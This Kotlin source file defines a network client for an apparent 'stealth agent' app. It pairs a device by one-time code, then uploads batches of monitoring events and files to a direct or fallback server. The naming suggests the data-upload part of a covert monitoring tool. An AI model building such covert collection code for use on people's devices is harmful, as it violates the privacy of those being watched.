package com.stealthagent.network

import com.stealthagent.data.AgentRepository
import com.stealthagent.model.EventBatch
import com.stealthagent.model.EventPayload
import com.stealthagent.model.MonitoringEvent
import com.stealthagent.model.PairRequest
import com.stealthagent.model.PairResponse
import io.ktor.client.HttpClient
import io.ktor.client.call.body
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.contentnegotiation.ContentNegotiation
import io.ktor.client.request.bearerAuth
import io.ktor.client.request.forms.formData
import io.ktor.client.request.forms.submitFormWithBinaryData
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.http.ContentType
import io.ktor.http.Headers
import io.ktor.http.HttpHeaders
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import io.ktor.serialization.kotlinx.json.json
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AgentClient @Inject constructor(
    private val repository: AgentRepository,
) {
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
    private val client: HttpClient by lazy {
        HttpClient(OkHttp) { install(ContentNegotiation) { json(json) } }
    }

    private fun getBaseUrl(): String {
        val direct = repository.directUrl.trimEnd('/')
        if (direct.isNotBlank()) {
            return direct
        }
        return repository.serverUrl.trimEnd('/')
    }

    suspend fun pair(otp: String, deviceName: String): PairResponse? {
        val base = repository.serverUrl.trimEnd('/')
        if (base.isBlank()) return null
        return runCatching {
            val response = client.post("$base/pair") {
                contentType(ContentType.Application.Json)
                setBody(PairRequest(otp = otp, deviceName = deviceName))
            }
            if (response.status.isSuccess()) response.body<PairResponse>() else null
        }.getOrNull()
    }

    suspend fun uploadBatch(events: List<MonitoringEvent>): Boolean {
        val base = getBaseUrl()
        if (base.isBlank() || !repository.isPaired) return false

        val directSuccess = if (repository.directUrl.isNotBlank()) {
            tryUpload(repository.directUrl.trimEnd('/'), events)
        } else false

        if (directSuccess) return true

        val serverUrl = repository.serverUrl.trimEnd('/')
        if (serverUrl.isBlank() || serverUrl == repository.directUrl.trimEnd('/')) return false
        return tryUpload(serverUrl, events)
    }

    private suspend fun tryUpload(baseUrl: String, events: List<MonitoringEvent>): Boolean {
        return runCatching {
            val batch = EventBatch(
                deviceId = repository.deviceId,
                events = events.map { e ->
                    EventPayload(id = e.id, kind = e.kind, payload = e.payload, capturedAt = e.capturedAt)
                }
            )
            val response = client.post("$baseUrl/events/batch") {
                contentType(ContentType.Application.Json)
                bearerAuth(repository.authToken)
                setBody(batch)
            }
            response.status.isSuccess()
        }.getOrDefault(false)
    }

    suspend fun uploadFile(
        baseUrl: String? = null,
        fileBytes: ByteArray,
        fileName: String,
        mimeType: String,
        category: String,
    ): Boolean {
        val base = baseUrl ?: getBaseUrl()
        if (base.isBlank() || !repository.isPaired) return false
        return runCatching {
            val response = client.submitFormWithBinaryData(
                url = "$base/files/upload",
                formData = formData {
                    append("fileName", fileName)
                    append("mimeType", mimeType)
                    append("category", category)
                    append("file", fileBytes, Headers.build {
                        append(HttpHeaders.ContentDisposition, "filename=\"$fileName\"")
                        append(HttpHeaders.ContentType, mimeType)
                    })
                }
            ) { bearerAuth(repository.authToken) }
            response.status.isSuccess()
        }.getOrDefault(false)
    }
}
